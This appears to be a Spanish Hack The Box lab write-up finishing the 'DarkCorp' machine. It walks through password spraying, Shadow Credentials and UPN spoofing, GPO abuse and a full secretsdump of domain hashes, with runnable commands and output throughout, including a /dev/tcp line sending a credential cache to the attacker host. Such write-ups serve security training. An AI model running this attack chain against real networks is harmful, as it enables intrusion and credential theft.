![](<img/Pasted image 20260504224742.png>)
Hacemos Password Spraying contra el Domain Controller con la contraseña obtenida:

```bash
proxychains -q netexec smb 172.16.20.1 -u users.txt -p 'Pack_Beneath_Solid9!' --continue-on-success
```

![](<img/Pasted image 20260504224708.png>)
¡Login exitoso para el usuario `john.w`! Revisando BloodHound, vemos que `john.w` tiene permisos de `GenericWrite` sobre `angela.w`. Esto nos abre varias vías: Shadow Credentials, UPN Spoofing o configurar un SPN para Kerberoasting:
![](<img/Pasted image 20260504224821.png>)
![](<img/Pasted image 20260504225219.png>)
Además existe la cuenta `angela.w.adm`, que pertenece al grupo privilegiado `LINUX_ADMINS`. La ruta más limpia es UPN Spoofing. Primero usamos `certipy shadow auto` para extraer el hash NT de `angela.w`:

```bash
proxychains -q certipy shadow auto -username john.w -p Pack_Beneath_Solid9! -account angela.w -target dc-01.darkcorp.htb
```
![](<img/Pasted image 20260504224926.png>)
Verificamos que el hash NT funciona contra el Domain Controller:

```bash
proxychains -q netexec smb 172.16.20.1 -u angela.w -H 957246c8137069bca672dc6aa0af7c7a
```

![](<img/Pasted image 20260504224943.png>)
Verificamos con `bloodyAD` el valor actual del atributo `userPrincipalName` de `angela.w`:

```bash
proxychains -q python3 /opt/bloodyAD/bloodyAD.py --domain darkcorp.htb --host dc-01 -u john.w -p 'Pack_Beneath_Solid9!' get object angela.w | grep userPrincipalName
```
![](<img/Pasted image 20260504225850.png>)
Modificamos el `userPrincipalName` de `angela.w` para asignarle el valor `angela.w.adm`:

```bash
proxychains -q /opt/bloodyAD/bloodyAD.py --domain darkcorp.htb --host dc-01 -u john.w -p 'Pack_Beneath_Solid9!' set object angela.w userPrincipalName -v angela.w.adm
```
![](<img/Pasted image 20260504230001.png>)
Revisamos nuevamente el atributo para confirmar el cambio:

```bash
proxychains -q /opt/bloodyAD/bloodyAD.py --domain darkcorp.htb --host dc-01 -u john.w -p 'Pack_Beneath_Solid9!' get object angela.w | grep "userPrincipalName"
```

![](<img/Pasted image 20260504230136.png>)
Solicitamos un TGT con `getTGT.py` especificando el tipo de principal `NT_ENTERPRISE` (lo que fuerza la autenticación mediante el `userPrincipalName` en lugar del `sAMAccountName`):

```bash
proxychains -q getTGT.py -hashes :957246c8137069bca672dc6aa0af7c7a -principalType 'NT_ENTERPRISE' darkcorp.htb/angela.w.adm
```
![](<img/Pasted image 20260504230230.png>)
En resumen: solicitamos un ticket usando las credenciales de `angela.w` pero con el alias `angela.w.adm`. Al resolver por `NT_ENTERPRISE`, el KDC emite el TGT a nombre de `angela.w.adm`. Cuando lo usemos para autenticarnos en Linux mediante `ksu`, este verificará el principal del ticket y nos permitirá cambiar de identidad a `angela.w.adm`:

Transferimos el ticket `.ccache` a la máquina Linux inicial donde tenemos sesión como `ebelford`:

```bash
python3 -m http.server 8082
```

![](<img/Pasted image 20260504230443.png>)

```bash
wget http://10.10.14.141:8082/angela.w.adm.ccache
```

![](<img/Pasted image 20260504230437.png>)
Copiamos el archivo `.ccache` a `/dev/shm/`:

```bash
cp angela.w.adm.ccache /dev/shm/
```

![](<img/Pasted image 20260504230516.png>)
Cambiamos de usuario a `angela.w.adm` con `ksu` utilizando el ticket Kerberos:

```bash
KRB5CCNAME=angela.w.adm.ccache.1 ksu angela.w.adm
```
![](<img/Pasted image 20260504231004.png>)
Comprobamos los privilegios con `sudo -l`:

```bash
sudo -l && sudo -i
```
![](<img/Pasted image 20260504231042.png>)
¡Tenemos privilegios totales sin contraseña! Nos convertimos en `root`. Ahora investigamos SSSD (System Security Services Daemon), el servicio que conecta Linux con Active Directory, para ver si almacena credenciales en caché local:

```bash
cat /etc/sssd/sssd.conf
```

![](<img/Pasted image 20260504231202.png>)
Efectivamente tiene el almacenamiento en caché habilitado. Listamos `/var/lib/sss/db/`:

```bash
ls /var/lib/sss/db
```
![](<img/Pasted image 20260504231233.png>)
Encontramos la base de datos de caché (`cache_darkcorp.htb.ldb`). La transferimos a nuestra máquina atacante a través de un socket TCP con Netcat:

![](<img/Pasted image 20261013135114.png>)

```bash
cat cache_darkcorp.htb.ldb >> /dev/tcp/10.10.14.141/4444
```
![](<img/Pasted image 20260504231556.png>)
```bash
sudo nc -nvlp 4444 > cache_darkcorp.htb.ldb
```
![](<img/Pasted image 20260504231602.png>)
Consultamos la base de datos LDB con `ldbsearch` para ver qué usuarios tienen contraseñas almacenadas en caché:

```bash
ldbsearch -H cache_darkcorp.htb.ldb '(cachedPassword=*)'
asq: Unable to register control with rootdse!
# record 1
dn: name=taylor.b.adm@darkcorp.htb,cn=users,cn=darkcorp.htb,cn=sysdb
createTimestamp: 1736373877
fullName: Taylor Barnard ADM
gecos: Taylor Barnard ADM
gidNumber: 1730400513
name: taylor.b.adm@darkcorp.htb
objectCategory: user
uidNumber: 1730414101
objectSIDString: S-1-5-21-3432610366-2163336488-3604236847-14101
uniqueID: 6780d137-c4a5-49c2-9240-47ae051365c6
originalDN: CN=Taylor Barnard ADM,CN=Users,DC=darkcorp,DC=htb
originalMemberOf: CN=gpo_manager,CN=Users,DC=darkcorp,DC=htb
originalMemberOf: CN=linux_admins,CN=Users,DC=darkcorp,DC=htb
originalMemberOf: CN=Remote Management Users,CN=Builtin,DC=darkcorp,DC=htb
originalModifyTimestamp: 20250108215501.0Z
entryUSN: 118872
adAccountExpires: 9223372036854775807
adUserAccountControl: 66048
nameAlias: taylor.b.adm@darkcorp.htb
isPosix: TRUE
lastUpdate: 1736373877
initgrExpireTimestamp: 0
ccacheFile: FILE:/tmp/krb5cc_1730414101_B5njUL
cachedPassword: $6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHv
 lnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.
cachedPasswordType: 1
lastCachedPasswordChange: 1736373912
failedLoginAttempts: 0
lastOnlineAuth: 1736373912
lastOnlineAuthWithCurrentToken: 1736373912
lastLogin: 1736373912
memberof: name=Domain Users@darkcorp.htb,cn=groups,cn=darkcorp.htb,cn=sysdb
memberof: name=linux_admins@darkcorp.htb,cn=groups,cn=darkcorp.htb,cn=sysdb
memberof: name=gpo_manager@darkcorp.htb,cn=groups,cn=darkcorp.htb,cn=sysdb
dataExpireTimestamp: 1
distinguishedName: name=taylor.b.adm@darkcorp.htb,cn=users,cn=darkcorp.htb,cn=
 sysdb
```

Encontramos el usuario `taylor.b.adm` (miembro de `gpo_manager` y `linux_admins`). Extraemos su hash SHA-512 crypt para crackearlo con Hashcat:

```bash
cat cache_darkcorp.htb.ldb | strings -n 60 | grep '\$'
```
![](<img/Pasted image 20260504231853.png>)
Lo crackeamos con Hashcat:

```bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt
```

![](<img/Pasted image 20260504232318.png>)
¡Obtenemos la contraseña en texto claro: `!QAZzaq1`! Probamos las credenciales en Linux:

```bash
su - taylor.b.adm
```
![](<img/Pasted image 20260504232801.png>)
Funcionan. Comprobamos con NetExec si tenemos privilegios de administrador en el Domain Controller:

```bash
proxychains -q netexec smb 172.16.20.1 -u taylor.b.adm -p '!QAZzaq1'
```

![](<img/Pasted image 20260504232918.png>)
Aún no tenemos privilegios sobre SMB. Comprobamos si podemos acceder por WinRM:

```bash
proxychains -q netexec winrm 172.16.20.1 -u taylor.b.adm -p '!QAZzaq1'
```
![](<img/Pasted image 20260504233148.png>)
¡Acceso WinRM confirmado! Nos conectamos con Evil-WinRM:

```bash
proxychains -q /home/isma/.local/share/gem/ruby/3.4.0/bin/evil-winrm -i 172.16.20.1 -u taylor.b.adm -p '!QAZzaq1'
```
![](<img/Pasted image 20260504233519.png>)
Enumeramos los grupos de pertenencia del usuario:

```bash
whoami /groups
```
![](<img/Pasted image 20260504234022.png>)
Vemos que `taylor.b.adm` forma parte del grupo `gpo_manager`. Consultamos en BloodHound qué directivas de grupo (GPO) podemos modificar:
![](<img/Pasted image 20260504234116.png>)
Con el ID de la GPO modificable (`652CAE9A-4BB7-49F2-9E52-3361F33CE786`), usamos `pyGPOAbuse.py` para inyectar una tarea que agregue a `taylor.b.adm` al grupo local de Administradores del Domain Controller:

```bash
proxychains -q python3 pygpoabuse.py 'darkcorp.htb/taylor.b.adm:!QAZzaq1' -gpo-id 652CAE9A-4BB7-49F2-9E52-3361F33CE786 -command 'net localgroup administrators taylor.b.adm /add' -f 
```

![](<img/Pasted image 20260504235329.png>)
La directiva se modifica con éxito. Comprobamos con NetExec si ya somos administradores del DC:

```bash
proxychains -q netexec smb dc-01 -u taylor.b.adm -p '!QAZzaq1'
```
![](<img/Pasted image 20260504235642.png>)
¡(Pwn3d!)! Ya somos administradores locales en el Domain Controller. Dumpeamos los secretos (`SAM`, `LSA` y la base de datos `NTDS.dit`) con `secretsdump.py`:

```bash
(env) ➜  pyGPOAbuse proxychains -q secretsdump.py 'darkcorp.htb/taylor.b.adm:!QAZzaq1@dc-01'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe7c8f385f342172c7b0267fe4f3cbbd6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
darkcorp\DC-01$:aes256-cts-hmac-sha1-96:23f8c53f91fd2035d0dc5163341bd883cc051c1ba998f5aed318cd0d820fa1b2
darkcorp\DC-01$:aes128-cts-hmac-sha1-96:2715a4681263d6f9daf03b7dd7065a23
(env) ➜  pyGPOAbuse sudo proxychains -q secretsdump.py 'darkcorp.htb/taylor.b.adm:!QAZzaq1@dc-01'
[sudo] password for isma: 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xe7c8f385f342172c7b0267fe4f3cbbd6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
darkcorp\DC-01$:aes256-cts-hmac-sha1-96:23f8c53f91fd2035d0dc5163341bd883cc051c1ba998f5aed318cd0d820fa1b2
darkcorp\DC-01$:aes128-cts-hmac-sha1-96:2715a4681263d6f9daf03b7dd7065a23
darkcorp\DC-01$:des-cbc-md5:eca71034201a3826
darkcorp\DC-01$:plain_password_hex:90d17589c9c348f3ea541982f161b1f658cec76e33e32762cba25cf55643a853efd93dd5cffec0cba16e008a2c7112715437d6a33b72e28405c53f68965349b0676128c9cb1997717523971bdaf255f72d9664d3ed5c06f1e5eb3a5b2ef6dc435727ed160e340591724e1230782e2484e25f8484a7b21bf102f71c9a91219cc23743377526a9c73eec8a70def939e673dd244d21be9ec18ba0d915bc080e8bfb3ac8953b5c6e64adb1107b062ddad75ce0e1f805bcdb52de979599787fac9d8246807055b4671191a41804f7918da2b82e3a4fde2959cd227a8af08982a89bcc7437e13426e8ff74273c4e0538a65eeb
darkcorp\DC-01$:aad3b435b51404eeaad3b435b51404ee:45d397447e9d8a8c181655c27ef31d28:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x395bad4405a9fd2285737a8ce7c6d9d60e6fceb3
dpapi_userkey:0x3f426bba655ad645920a84d740836ed1edf35836
[*] NL$KM 
 0000   65 DB D5 E7 F9 08 5C 24  AB 45 B5 E5 5D E5 3F DD   e.....\$.E..].?.
 0010   89 93 2A C7 F3 70 1E 5A  B7 8D 4E D3 BA 3B 5F 0C   ..*..p.Z..N..;_.
 0020   A9 FC 32 69 57 6D E6 78  D0 07 33 43 FE 1E 06 A6   ..2iWm.x..3C....
 0030   1E 56 2C 27 91 47 56 54  91 0D 20 79 E7 7A 2F 95   .V,'.GVT.. y.z/.
NL$KM:65dbd5e7f9085c24ab45b5e55de53fdd89932ac7f3701e5ab78d4ed3ba3b5f0ca9fc3269576de678d0073343fe1e06a61e562c2791475654910d2079e77a2f95
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c032c3e2657f4554bc7af108bd5ef17:::
victor.r:1103:aad3b435b51404eeaad3b435b51404ee:06207752633f7509f8e2e0d82e838699:::
svc_acc:1104:aad3b435b51404eeaad3b435b51404ee:01f55ea10774cce781a1b172478fcd25:::
john.w:1105:aad3b435b51404eeaad3b435b51404ee:b31090fdd33a4044cd815558c4d05b04:::
angela.w:1106:aad3b435b51404eeaad3b435b51404ee:957246c8137069bca672dc6aa0af7c7a:::
angela.w.adm:1107:aad3b435b51404eeaad3b435b51404ee:cf8b05d0462fc44eb783e3f423e2a138:::
taylor.b:1108:aad3b435b51404eeaad3b435b51404ee:ab32e2ad1f05dab03ee4b4d61fcb84ab:::
taylor.b.adm:14101:aad3b435b51404eeaad3b435b51404ee:0577b4b3fb172659dbac0be4554610f8:::
darkcorp.htb\eugene.b:25601:aad3b435b51404eeaad3b435b51404ee:84d9acc39d242f951f136a433328cf83:::
darkcorp.htb\bryce.c:25603:aad3b435b51404eeaad3b435b51404ee:5aa8484c54101e32418a533ad956ca60:::
DC-01$:1000:aad3b435b51404eeaad3b435b51404ee:45d397447e9d8a8c181655c27ef31d28:::
DRIP$:1601:aad3b435b51404eeaad3b435b51404ee:42ef4647a1e14d1143aed111521a535a:::
WEB-01$:20601:aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:97064b5e2ed9569a7a61cb6e71fd624e20de8464fc6d3f7f9c9ccd5ec865cd05
Administrator:aes128-cts-hmac-sha1-96:0424167c3041ed3b8df4ab1c996690c1
Administrator:des-cbc-md5:a1b004ad46dc19d9
krbtgt:aes256-cts-hmac-sha1-96:2795479225a152c8958119e8549079f2a59e101d84a3e464603a9cced55580d6
krbtgt:aes128-cts-hmac-sha1-96:183ebcd77ae33f476eb13c3f4404b98d
krbtgt:des-cbc-md5:7fe9e5ad67524001
victor.r:aes256-cts-hmac-sha1-96:84e79cb6b8959ebdda0dc73d2c6728bb9664d0d75c2aef702b0ea0a4126570bb
victor.r:aes128-cts-hmac-sha1-96:bc1fa04172b62be4428af05dcd4941af
victor.r:des-cbc-md5:62491fa740918316
svc_acc:aes256-cts-hmac-sha1-96:21ebfe2a41e5d614795ef004a06135748d5af03d0f2ca7fd6f6d804ac00f759a
svc_acc:aes128-cts-hmac-sha1-96:aebdba02d03943f17f553495f5f5e1d1
svc_acc:des-cbc-md5:5bec0bb54a405ed9
john.w:aes256-cts-hmac-sha1-96:6c0d89a7461f21150bbab0e4c9dea04ca4feb27a4f432c95030dbfa17f4f7de5
john.w:aes128-cts-hmac-sha1-96:16da7304c10a476b10a0ad301f858826
john.w:des-cbc-md5:e90b041f52b30875
angela.w:aes256-cts-hmac-sha1-96:25f7053fcfb74cf4f02dab4b2c7cb1ae506f3c3c09e4a5b7229b9f21a761830a
angela.w:aes128-cts-hmac-sha1-96:15f1467015c7cdd49ef74fd2fe549cf3
angela.w:des-cbc-md5:5b0168dacbc22a5e
angela.w.adm:aes256-cts-hmac-sha1-96:bec3236552b087f396597c10431e9a604be4b22703d37ae45cde6cd99873c693
angela.w.adm:aes128-cts-hmac-sha1-96:994dccb881c6a80c293cac8730fd18a2
angela.w.adm:des-cbc-md5:cb0268169289bfd9
taylor.b:aes256-cts-hmac-sha1-96:b269239174e6de5c93329130e77143d7a560f26938c06dae8b82cae17afb809c
taylor.b:aes128-cts-hmac-sha1-96:a3f7e9307519e6d3cc8e4fba83df0fef
taylor.b:des-cbc-md5:9b8010a21f1c7a3d
taylor.b.adm:aes256-cts-hmac-sha1-96:4c1e6783666861aac09374bee2bc48ba5ad331f3ac87e067c4a330c6a31dd71a
taylor.b.adm:aes128-cts-hmac-sha1-96:85712fd85df4669be88350520651cfe2
taylor.b.adm:des-cbc-md5:ce6176f4f4e5cd9e
darkcorp.htb\eugene.b:aes256-cts-hmac-sha1-96:33e0cf90ad3c5d0cd264207421c506b56b8ca9703b5be8c58a97169851067fd1
darkcorp.htb\eugene.b:aes128-cts-hmac-sha1-96:adf8b2743349be9684f8ec27df53fa92
darkcorp.htb\eugene.b:des-cbc-md5:2f5ef4b06b231afd
darkcorp.htb\bryce.c:aes256-cts-hmac-sha1-96:e835ec6b7d680472bdf65ac11ec17395930b5d778ba08481ef7290616b1fa7a8
darkcorp.htb\bryce.c:aes128-cts-hmac-sha1-96:09b1a46858723452ce11da2335b602b0
darkcorp.htb\bryce.c:des-cbc-md5:26d55b5849b6e623
DC-01$:aes256-cts-hmac-sha1-96:23f8c53f91fd2035d0dc5163341bd883cc051c1ba998f5aed318cd0d820fa1b2
DC-01$:aes128-cts-hmac-sha1-96:2715a4681263d6f9daf03b7dd7065a23
DC-01$:des-cbc-md5:8038f74f7c0da1b5
DRIP$:aes256-cts-hmac-sha1-96:9e08e8e40f69fc36a5732a6f72d0ab6f40f6fb8e6013daf2f7ee26362129bf28
DRIP$:aes128-cts-hmac-sha1-96:66e3352f59d8af0060d79b8ab1ba89ef
DRIP$:des-cbc-md5:ad072a0db67c7586
WEB-01$:aes256-cts-hmac-sha1-96:f16448747d7df00ead462e40b26561ba01be87d83068ef0ed766ec8e7dd2a12e
WEB-01$:aes128-cts-hmac-sha1-96:7867cb5a59da118ad045a5da54039eae
WEB-01$:des-cbc-md5:38e00bb3d901eaef
[*] Cleaning up... 
```
![](<img/Pasted image 20260505000519.png>)
Con el hash NT del usuario `Administrator`, realizamos Pass-The-Hash mediante Evil-WinRM y capturamos la flag de root en `DC-01`:

```bash
proxychains -q /home/isma/.local/share/gem/ruby/3.4.0/bin/evil-winrm -i 172.16.20.1 -u administrator -H fcb3ca5a19a1ccf2d14c13e8b64cde0f
```
![](<img/Pasted image 20260505000734.png>)

[Hecho!!](https://labs.hackthebox.com/achievement/machine/3092965/647)

![](<img/druski-dance.gif>)

![](<img/Pasted image 20260506203110.png>)

